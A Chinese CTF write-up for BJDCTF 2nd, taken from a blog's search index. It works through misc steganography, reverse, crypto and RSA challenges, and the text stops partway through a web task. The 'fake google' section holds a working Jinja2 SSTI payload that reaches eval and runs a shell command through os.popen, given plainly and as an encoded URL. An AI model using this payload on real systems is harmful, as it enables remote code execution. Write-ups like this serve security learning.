<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF | BJDCTF 2nd WriteUp</title>
      <link href="/2020/03/23/CTF_BJDCTF2nd/"/>
      <url>/2020/03/23/CTF_BJDCTF2nd/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote><p>本届BJDCTF由江苏科技大学、北京工业大学、西南民族大学、杭州师范大学、 江苏大学、湖南工业大学（排名不分先后）联合举办</p></blockquote><p>划水划水~ 周末水了一下 BJDCTF 2nd。</p><p>看了一下，好像 BJDCTF 2020 已经有过一轮比赛了唉，这是第二届了？？？（一个月一届？</p><p>官方声称这是一个<strong>萌新赛</strong>，总体难度不算很大，于是就来玩了一下。</p><p>然而喵喵喵，的确让我知道了自己本来就是萌新。嘤嘤嘤。</p><p>题目在这里↓。</p><blockquote><p>BUUCTF 公开赛道：<a href="https://buuoj.cn/" target="_blank" rel="noopener">戳这里</a><br>hint 汇总：<a href="http://gem-love.com/BJDCTF_hint.html" target="_blank" rel="noopener">在这里</a></p></blockquote><p>这次玩的不多，主要做了点 Misc, Crypto, Reverse 的题，Web 没怎么看（后面可能会学一下 PHP、SQL 吧），pwn 没看……</p><p>简单写一下 WriteUp 吧，有的参考了一下大佬们的思路，<del>不完善的后面再补吧</del>。</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="最简单的misc-y1ng"><a href="#最简单的misc-y1ng" class="headerlink" title="最简单的misc-y1ng"></a>最简单的misc-y1ng</h3><p>压缩包伪加密，末尾两个 504B0102 之后的加密位改为 00.</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/PK00.png" alt="伪加密"></p><p>解压后看到是 IHDR ，噢是 png，补上文件头 89504E47.</p><p>得到下面的图片。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/secret.png" alt="secret"></p><p><code>424A447B79316E677A756973687561697D</code></p><p>hex 转 ASCII    </p><p><code>BJD{y1ngzuishuai}</code></p><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>图片大小改了。。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc-A_Beautiful_Picture.png" alt="改大小"></p><p>得到</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc-A_Beautiful_Picture-DreamerJack1.png" alt=""></p><h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p><img src="/2020/03/23/CTF_BJDCTF2nd/ezbb.jpg" alt="题目"></p><p>图片二进制拼接隐写，提取得到压缩包，压缩包里是 <code>里面都是出题人.jpg</code>。</p><p>十六进制编辑器看发现是 avi 格式。改后缀播放，噢是 <del>性感</del>钉钉在线求饶 的视频。</p><p>发现插入了几个图片，还有二维码。</p><p>于是 PR 大法好。逐帧看得到下面几张二维码。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa1.png" alt="Misc_EasyBaBa1"></p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa2.png" alt="Misc_EasyBaBa2"></p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa3.png" alt="Misc_EasyBaBa3"></p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa4.png" alt="Misc_EasyBaBa4"></p><p>分别得到</p><p>6167696E5F6C   -&gt;  agin_l</p><p>6F76655F59        -&gt;   ove_Y</p><p>424A447B696D   -&gt;  BJD{im</p><p>316E677D            -&gt;  1ng}</p><p>连成一句话</p><p><code>BJD{imagin_love_Y1ng}</code></p><p><em>（这俩啥关系唉 嘤嘤嘤</em> </p><h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p><img src="/2020/03/23/CTF_BJDCTF2nd/ezbb_r.png" alt="题目"></p><p>刚开始以为是 LSB 之类的，看了各个图层都没明显的，但整体都是有明显的颗粒感……</p><p>后来以为是和上面那题的图有关系，对两张图做了加减等等操作，没有收获。</p><p>再看 hex 数据，这一堆还是感觉像二维码，这么规则的0和1。</p><p>最后，在我准备关掉 010editor 的时候，伸了个懒腰，从远处看，啊！</p><p>这也太有脑洞了吧！（自行脑部将<code>FF</code>或<code>ÿÿ</code>看成是实线就行）</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_RealEasyBaBa.png" alt="Misc_RealEasyBaBa"></p><p>于是得到flag。</p><p><code>BJD{572154976}</code></p><p><em>（这好像是 imagin 师傅的QQ号唉</em></p><h3 id="Imagin-开场曲"><a href="#Imagin-开场曲" class="headerlink" title="Imagin - 开场曲"></a>Imagin - 开场曲</h3><p>之前就看过这个 mikutap，前几天晚上还有个学弟 at 我来一起玩（探究）的……</p><p>就是这个→<a href="http://taqini.space/mikutap/" target="_blank" rel="noopener">http://taqini.space/mikutap/</a> ，多有意思呢。</p><p>他这个每一个按键对应着一个音调和一个动画，理论上可以逆向回去得到 flag。</p><p>拖进 PR 了反复听了好多遍，确定了几个字符，比如第一个字符应该是<code>M</code>……</p><p>原来是根据音调和动画来判断的，换了一个浏览器，发现动画不一样了，草（一种植物），不玩了惹。</p><p>思路感觉可以先录一段 BGM，做一个 sub 把视频中的 BGM 去除。而后给每一个按键录一个，确定映射关系，理论上就能唯一对应上原始按键。</p><p>（感觉直接听出来的真强，怕不是音游大佬？</p><h3 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h3><p>这道题之前一直没解出来，最后放了 hint 说解压密码是文件名。</p><p>于是手动解压了几个……每个都是上一个的密码。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_targz.png" alt="Misc_targz"></p><p>发现这样估计好久都解不完，于是写 jio 本！</p><p>搜了一下压缩包解压的 API，改了一下别人的代码，写了个循环。</p><p>考虑到最后的 flag 套娃很多不方便打开，于是就统一解压到一个相同的目录下好了。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> zipfile<span class="token keyword">def</span> <span class="token function">unzip_single</span><span class="token punctuation">(</span>src_file<span class="token punctuation">,</span> dest_dir<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''     解压单个文件到目标文件夹。    '''</span>    <span class="token keyword">if</span> password<span class="token punctuation">:</span>        password <span class="token operator">=</span> password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    zf <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        zf<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span>dest_dir<span class="token punctuation">,</span> pwd<span class="token operator">=</span>password<span class="token punctuation">)</span>    <span class="token keyword">except</span> RuntimeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    zf<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    source_dir <span class="token operator">=</span> r<span class="token string">'./hW1ES89jF'</span>    dest_dir <span class="token operator">=</span> r<span class="token string">'./hW1ES89jF'</span>    password <span class="token operator">=</span> <span class="token string">'OKMIlLVft'</span>    i <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        entry_dir <span class="token operator">=</span> dest_dir <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">'.tar.gz'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> password<span class="token punctuation">)</span>        dest_dir <span class="token operator">=</span> source_dir <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> password        unzip_single<span class="token punctuation">(</span>entry_dir<span class="token punctuation">,</span> dest_dir<span class="token punctuation">,</span> password<span class="token punctuation">)</span>        entry <span class="token operator">=</span> list<span class="token punctuation">(</span>os<span class="token punctuation">.</span>scandir<span class="token punctuation">(</span>dest_dir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> entry<span class="token punctuation">.</span>is_file<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>entry<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.gz'</span><span class="token punctuation">:</span>            password <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>entry<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error!'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">1</span></code></pre><p>跑了一下发现最后在<code>8L0WifU3G</code>这个目录下，套娃了 299 还是 300个压缩包……</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_targz2.png" alt="Misc_targz2"></p><p>打开得到 flag：</p><p><code>BJD{wow_you_can_rea11y_dance}</code></p><h3 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h3><p>这题看了好久都没做出来……知道图片上有明显的错位，010editor 的脚本跑不下去。肯定是插入了东西。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_xiaojiejie.png" alt="小姐姐"></p><p>用了 strings 找，然而太懒没开 Ubuntu，没用上 grep，于是出了一堆字符串没发现 BJD……</p><p>怪我懒了（连 PentestBox 都懒得开，Ctrl + F 都懒得用</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_xiaojiejie_flag.png" alt="flag"></p><p><code>BJD{haokanma_xjj}</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h3><p>猜大小的游戏唉。玩个毛线，没有flag！</p><p>丢 IDA 里，看字符串就得到 flag。</p><p><code>BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}</code></p><p>果然是个随机数逗你玩呢。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Re_guessgame.png" alt="guessgame"></p><h3 id="8086"><a href="#8086" class="headerlink" title="8086"></a>8086</h3><p><img src="/2020/03/23/CTF_BJDCTF2nd/Re_8086.png" alt="8086"></p><p>看亚子只是把数据移到 DS 里，然后就死循环了。</p><p>之前学的微机原理 汇编忘得差不多了……（想起来这学期 DSP 后面编程还要用到 emmm</p><p>在 seg dseg 里有这一坨</p><p><code>]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;</code></p><p>想了半天不知道是什么。。base91 解码不行。</p><p><del>难道是大小端问题？</del> 不是。</p><p>后面打开了ASCII表，既然 flag 格式是 <code>BJD{.+}</code>，前四位肯定对应着<code>BJD{</code>。这里对应着列出来。</p><table><thead><tr><th>Bin （二进制）</th><th>Oct （八进制）</th><th>Dec （十进制）</th><th>Hex （十六进制）</th><th>缩写/字符</th></tr></thead><tbody><tr><td>0111 1101</td><td>0175</td><td>125</td><td>0x7D</td><td>}</td></tr><tr><td>0100 0010</td><td>0102</td><td>66</td><td>0x42</td><td>B</td></tr><tr><td>0101 0101</td><td>0125</td><td>85</td><td>0x55</td><td>U</td></tr><tr><td>0100 1010</td><td>0112</td><td>74</td><td>0x4A</td><td>J</td></tr><tr><td>0110 0100</td><td>0144</td><td>100</td><td>0x64</td><td>d</td></tr><tr><td>0111 1011</td><td>0173</td><td>123</td><td>0x7B</td><td>{</td></tr></tbody></table><p>突然就发现了规律！</p><p>二进制后四位明显是取了反，前四位中的最低位也取了个反。</p><p>py一下，写了个jio本。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>s <span class="token operator">=</span> <span class="token string">']U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;'</span>output <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x0f</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> chr<span class="token punctuation">(</span>temp <span class="token operator">^</span> <span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 或者直接 ^ 0x1f</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    output <span class="token operator">+=</span> temp<span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># BJD{jack_de_hu1b1an_xuede_henHa0}$</span></code></pre><p>于是得到 flag 了！</p><p><code>BJD{jack_de_hu1b1an_xuede_henHa0}</code></p><p>嘤 要好好学汇编呢（</p><blockquote><p>看了 WP 发现原来是解密的代码被 IDA 当成是数据了（就是<code>assume ss:dseg, ds:nothing</code> 上面的那一部分）。</p><p>奇怪了我拿 emu8086 模拟器也没看到这一段，还跑死循环了。噢，<strong>本来就没跑到解密那部分代码！</strong></p><p>偷一下出题师傅的源代码，来自<a href="https://renjikai.com/bjdctf-2-dreamerjack/" target="_blank" rel="noopener">这里</a>。</p><pre class=" language-assembly"><code class="language-assembly">DATAS SEGMENT    str1 DB 5dH,55H,5bH,64H,75H,7eH,7cH,74H    DB 40H,7bH,7aH,40H,77H,6aH,2eH,7dH,2eH    DB 7eH,71H,40H,67H,6aH,7aH,7bH,7aH,40H    DB 77H,7aH,71H,57H,7eH,2fH,62H,59DATAS ENDSSTACKS SEGMENTSTACKS ENDSCODES SEGMENT    ASSUME CS:CODES,DS:DATAS,SS:STACKSloc:    jmp loc    mov CX,34    lea BX,str1lop:    mov DI,CX    dec DI    xor BYTE PTR [BX][DI],31    loop lop    lea DX,str1    mov AH,09H    int 21H    retSTART:    MOV AX,DATAS    MOV DS,AX    call loc    MOV AH,4CH    INT 21HCODES ENDS    END START</code></pre><p>解密的部分在<code>lop</code>里，果然是和 31（0x1F）做 xor。</p></blockquote><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到-y1ng"><a href="#签到-y1ng" class="headerlink" title="签到-y1ng"></a>签到-y1ng</h3><p><code>QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==</code></p><p>base64 就行了。</p><p><code>BJD{W3lc0me_T0_BJDCTF}</code></p><h3 id="燕言燕语-y1ng"><a href="#燕言燕语-y1ng" class="headerlink" title="燕言燕语-y1ng"></a>燕言燕语-y1ng</h3><p><code>79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</code></p><p>hex to ASCII：</p><p><code>yanzi ZJQ{xilzv_iqssuhoc_suzjg}</code> </p><p>这个试了各种密码，真没想到是 vigenere 密码，还在想 yanzi 是干啥用的……</p><p>（下次先考虑带有密钥的</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_yanzi.png" alt="yanzi"></p><p><code>BJD{yanzi_jiushige_shabi}</code></p><blockquote><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p></blockquote><h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><pre><code>Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot'd z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf'o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. 'Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,' Pzffw ozqh,'os tsn wse azt czw usf lw hqttkf!' Tsn q nqbb vqjk wse npzd wse nztd.MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw}</code></pre><p>整了半天不知道咋办，最后想起来还有个词频大法！</p><p>搜了一下，<a href="https://quipqiup.com/" target="_blank" rel="noopener">这个网站</a> 可以分析词频。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_Yinglish.png" alt="image-20200321221758042"></p><p>很明显<code>MIH</code>对应着<code>BJD</code>。下面最像的就是这个了。</p><pre><code>Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn't a Japanese name but he is really a Japanese. Harry woryed in a lawyer's office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. 'I have never borrrowed any money from you,' Harry said,'so now you can pay for my dinner!' Now i will give you what you want. BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}</code></pre><p>然而交上去不对。。</p><p>看了 hint 说</p><blockquote><p>改成Cr4zy是错误的</p></blockquote><p>突然想到是<code>crack</code>！于是得到 flag。（真就 quipquip 这个网站啊</p><p><code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p>这是一张有着一堆喵喵的 gif。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/cat.gif" alt="cat"></p><p>8*10，想到是8位的 ASCII，10个字符。</p><p>01000010 果然是 <code>B</code></p><p>01111011 果然是 <code>{</code>，之后是</p><pre><code>01001101 00100001 01100001 00110000 01111110 01111101</code></pre><p>于是得到flag：<code>BJD{M!a0~}</code></p><p>真的是喵喵呀！</p><h3 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h3><blockquote><p>身经百战的Y1ng已经达到崇高的武术境界，以自律克己来取代狂热者的战斗狂怒与传统的战斗形式。Y1ng所受的训练也进一步将他们的灵能强化到足以瓦解周遭的物质世界。借由集中这股力量，Y1ng能释放灵能能量风暴来摧毁敌人的心智、肉体与器械。</p></blockquote><p><img src="/2020/03/23/CTF_BJDCTF2nd/jpg.png" alt=""></p><p>之前只知道猪圈密码，找了半天才发现了这个编码。</p><p>圣堂武士密码 (Templar Cipher) 是共济会的“猪圈密码”的一个变种，一直被共济会圣殿骑士用。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Templar_cipher.png" alt="Templar Cipher"></p><p>得到 <code>IMKNIGHTSTEMPLAR</code></p><p>最终 flag 为 <code>flag{IMKNIGHTSTEMPLAR}</code>。</p><h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><pre><code>罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</code></pre><p>这题还以为是佛曰，结果发现不是……</p><p>看到别人提示发现真的蠢，下次先拿去给翻译读一遍就知道 flag 了。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_old_illiterate.png" alt="Crypto_old_illiterate"></p><p>啊不对- - </p><p>flag 是 <code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code>。</p><h3 id="圣火昭昭-y1ng"><a href="#圣火昭昭-y1ng" class="headerlink" title="圣火昭昭-y1ng"></a>圣火昭昭-y1ng</h3><p>这个是佛曰了，不过是新佛曰。</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_Shenghuozhaozhao.png" alt="Crypto_Shenghuozhaozhao"></p><pre><code>新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</code></pre><p>找了半天没找到解密网站。。来，收藏夹请。</p><blockquote><p>新佛曰：<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">http://hi.pcmoe.net/buddha.html</a></p><p>佛曰（与佛论禅）：<a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://keyfc.net/bbs/tools/tudoucode.aspx</a></p></blockquote><p>得到 <code>gemlovecom</code></p><blockquote><p>开局一张图，flag全靠<strong>猜</strong> </p><p>因为出题人失误搞错了，解出来的key去掉后3位的com</p></blockquote><p>去掉<code>com</code>套上 <code>BJD</code> 交上去发现不是。</p><p>想到可能这还是个 key/密钥。试了 F5 发现不是。</p><p>后来看别人的 WP 才知道是 outguess 图像隐写。（回去补一补</p><blockquote><p>来了来了。</p><p>GitHub 仓库：<a href="https://github.com/crorvick/outguess" target="_blank" rel="noopener">https://github.com/crorvick/outguess</a></p><blockquote><p>OutGuess is a universal steganographic tool that allows the insertion<br>of hidden information into the redundant bits of data sources.  The<br>nature of the data source is irrelevant to the core of OutGuess.  The<br>program relies on data specific handlers that will extract redundant<br>bits and write them back after modification.  In this version the PNM<br>and JPEG image formats are supported.  In the next paragraphs, images<br>will be used as concrete example of data objects, though OutGuess can<br>use any kind of data, as long as a handler is provided.</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/crorvick/outguess.git<span class="token function">cd</span> outguess./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span></code></pre><p>（可能需要 sudo</p><p>常用的指令就加密和解密了。</p><pre class=" language-bash"><code class="language-bash">outguess -k <span class="token string">"my secret key"</span> -d hidden.txt demo.jpg out.jpg  <span class="token comment" spellcheck="true"># 加密</span>outguess -k <span class="token string">"my secret key"</span> -r out.jpg hidden.txt  <span class="token comment" spellcheck="true"># 解密</span></code></pre></blockquote><pre class=" language-bash"><code class="language-bash">outguess -k <span class="token string">"gemlove"</span> -r sheng_huo_zhao_zhao.jpg hidden.txt</code></pre><p>得到 flag：</p><p> <code>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></p><h3 id="rsa0"><a href="#rsa0" class="headerlink" title="rsa0"></a>rsa0</h3><p>噫？？？<strong>啥时候出的 RSA？没发现……</strong></p><p>来补一下吧。nc 连上，<del>性感xx</del>在线发题。（题目每个环境好像不同）</p><pre><code>e=8490247p+q=21369803408498318739708021526026723998776452182678577483200290221438162215918869820587899450236798144391224673258554041165789338090777089646275960540717728p-q=306146015710299885882907488963590997669550770952584505436005104300551321544811637977008351542375001985864015345039058904779091905194377534370393296886314c=96533573625923830275446881118319408503602914319563862122714988417081897004192103015036939165809559375266874500604915724088338754724344545059907114669824228931409760092764538519264244823654706558401180531000987759255359721495957457449739266870026844498908937249390027970957614362784724540009268878226262563888flag=??????</code></pre><p>分别求得</p><pre><code>p = 10837974712104309312795464507495157498223001476815580994318147662869356768731840729282453900889586573188544344301796550035284214997985733590323176918802021q = 10531828696394009426912557018531566500553450705862996488882142558568805447187029091305445549347211571202680328956757491130505123092791356055952783621915707N = 114143693083732767570968317133346423549060454090175301453735671171095767847167710539383793168600011860725545060200762757793552681268747848968704851107766270420356743799632674648383021525392085925089984102330388262453473594582267963382904432339836113984790742410134450191464532864589123878301032917283483243847d = 50742668784054743796077308928583295672870545303739312689100966737709824813210506078737292591220582907244279005756665043057883285178390377660818970279568204675194935893051526661876109033037071837499249580434595390423343646371583506816678001938953327743693429532902954037961714874373553064053942402868925112743</code></pre><p>而后利用 <code>m = pow(c, d, p*q)</code> 求得</p><pre><code>m=14337636555111949737591403676611178785005554188521046827164791353101910846974617354025302694785689419018</code></pre><p>转 Hex 再转 ASCII，得到 flag</p><p><code>flag{656092c1-50bb-459c-89ec-4cabc69b4f3e}</code></p><blockquote><p>也可以用 <code>long_to_bytes</code>（需要安装密码库 <code>pip install pycryptodome</code>）</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number<span class="token keyword">print</span><span class="token punctuation">(</span> number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token punctuation">)</span></code></pre><p>想起来之前说要装 GitHub 上那个 python的 RSA tools 还没装……</p></blockquote><h3 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h3><p>nc 连上，得到题目。</p><pre><code>e=12907381p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158685471447960359346072372178791917183606614428484134793166273614667932437583552c=30690312081989972161704287726249224946940662102974666523203576217410481202381028355251332967180090326230702940141819337845402788001804202167909768819975074688832043578916709160998681086084701179452449493798807368207904007880376512732622389948601375493793025349147924632369047347529229462962308486909978038157flag=??????</code></pre><p>再来一次</p><pre><code>e=10288339p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158685471447960359346072372178791917183606614428484134793166273614667932437583552c=40022015279445190961446033046832809408451288751696588671880831212771863683480569497860194263202064993145631813232350651196681717050659541769219283733622429570927906815646087878932340172422964403729228165631808591658687044189905364508055754933678525530280551473343005313236082014906927913996378291225656288550flag=??????</code></pre><p>p 和 q 不变，则 </p><p>$$<br>n = p*q = \frac{p^2 + q^2 - (p-q)^2}{2}<br>$$</p><p>不变，考虑是<strong>共模攻击</strong>，后面来填坑。<em>（等我装上 RSA tools</em></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>这次没怎么看 Web 题……（（</p><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>看到返回的页面上有个注释</p><p><code>&lt;!--ssssssti &amp; a little trick --&gt;</code></p><p>试了一下<code>{{1-1}}</code>可以得到 0，于是就是 SSTI 了。好像都不需要绕过。</p><p>payload：</p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}  {% for b in c.__init__.__globals__.values() %}  {% if b.__class__ == {}.__class__ %}    {% if 'eval' in b.keys() %}      {{ b['eval']('__import__("os").popen("cd /;cat flag").read()') }}    {% endif %}  {% endif %}  {% endfor %}{% endif %}{% endfor %}</code></pre><pre><code>http://f7ddf918-4b30-4225-b5c9-761bae6f5fdd.node3.buuoj.cn/qaq?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20%20%20%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20%20%20%20%20%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22cd%20/;cat%20flag%22).read()%27)%20}}%20%20%20%20{%%20endif%20%}%20%20{%%20endif%20%}%20%20{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%}</code></pre><p><code>flag{8c252513-5c42-47fd-95b5-4d13a986e6d0}</code></p><p>（貌似是动态 flag</p><h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p>​    <img src="/2020/03/23/CTF_BJDCTF2nd/Web_elementmaster.jpg" alt="Web_elementmaster"></p><p>手绘的唉（重点不对</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Web_elementmaster2.jpg" alt="source"></p><p>这里的<code>id</code>转 ASCII 得到 <code>Po.php</code>。</p><p>访问发现内容是一个 <code>.</code>，懵了。</p><p>给了 hint 说<code>mendeleev=门捷列夫</code>，还有 <code>from requests import *</code> 